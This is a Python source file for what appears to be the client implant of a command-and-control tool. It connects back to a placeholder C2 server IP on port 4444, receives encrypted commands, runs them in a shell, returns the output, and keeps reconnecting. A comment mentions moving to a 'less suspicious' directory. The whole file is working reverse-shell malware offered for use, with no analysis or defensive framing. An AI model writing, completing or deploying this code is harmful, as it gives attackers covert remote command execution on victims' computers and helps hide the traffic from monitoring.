import socket
import subprocess
import os
import time
import struct
from cryptography.fernet import Fernet

# --- Configuration ---
HOST = 'YOUR_C2_SERVER_IP' # The IP of your C2 server
PORT = 4444
BUFFER_SIZE = 4096
RECONNECT_INTERVAL = 5 # Time in seconds to wait before trying to reconnect
# PASTE YOUR GENERATED KEY HERE IN BYTES FORMAT (b'...')
ENCRYPTION_KEY = b'PASTE_YOUR_GENERATED_KEY_HERE_AS_BYTES' 

# Initialize the Fernet cipher with the key
cipher_suite = Fernet(ENCRYPTION_KEY)

def send_encrypted(conn, data):
    """Encrypts and sends data with a length prefix."""
    try:
        encrypted_data = cipher_suite.encrypt(data.encode('utf-8'))
        conn.sendall(struct.pack('>I', len(encrypted_data)) + encrypted_data)
        return True
    except (socket.error, BrokenPipeError):
        return False

def recv_encrypted(conn):
    """Receives data with a length prefix, then decrypts it."""
    try:
        raw_len = conn.recv(4)
        if not raw_len: return None
        
        data_len = struct.unpack('>I', raw_len)[0]
        
        data_chunks = []
        bytes_recd = 0
        while bytes_recd < data_len:
            chunk = conn.recv(min(data_len - bytes_recd, BUFFER_SIZE))
            if not chunk: return None
            data_chunks.append(chunk)
            bytes_recd += len(chunk)
            
        encrypted_data = b''.join(data_chunks)
        decrypted_data = cipher_suite.decrypt(encrypted_data).decode('utf-8')
        return decrypted_data
        
    except (socket.error, ConnectionResetError, struct.error, Exception):
        return None

def connect_to_server():
    """Establishes a connection to the C2 server."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            print(f"[*] Attempting to connect to {HOST}:{PORT}...")
            s.connect((HOST, PORT))
            print(f"[*] Connected to C2 server at {HOST}:{PORT}")
            return s
        except socket.error as e:
            print(f"[-] Connection failed: {e}. Retrying in {RECONNECT_INTERVAL} seconds...")
            time.sleep(RECONNECT_INTERVAL)

def main():
    """Main loop for the client agent."""
    
    # Change current working directory to something less suspicious
    try:
        os.chdir(os.path.expanduser('~'))
    except Exception:
        pass 
        
    while True:
        s = connect_to_server()
        try:
            while True:
                # Receive encrypted command from the server
                command = recv_encrypted(s)
                
                if command is None or command.lower() == 'exit':
                    break # Connection closed or exit command received

                # Improved command execution to handle a change in directory
                if command.lower().startswith('cd '):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        output = f"[*] Changed directory to: {os.getcwd()}"
                    except FileNotFoundError:
                        output = f"[-] No such directory: {path}"
                    except Exception as e:
                        output = f"[-] Error: {e}"
                else:
                    # Execute other commands
                    proc = subprocess.run(command, shell=True, capture_output=True, text=True, errors='ignore')
                    output = proc.stdout + proc.stderr
                    if not output:
                        output = "[*] Command executed with no output."
                
                # Send the encrypted command output back to the server
                if not send_encrypted(s, output):
                    break # Connection lost

        except (socket.error, ConnectionResetError, BrokenPipeError):
            print("[-] Connection lost. Attempting to reconnect...")
            s.close()
            time.sleep(RECONNECT_INTERVAL)
            continue # Go back to the connect_to_server loop

if __name__ == "__main__":
    main()
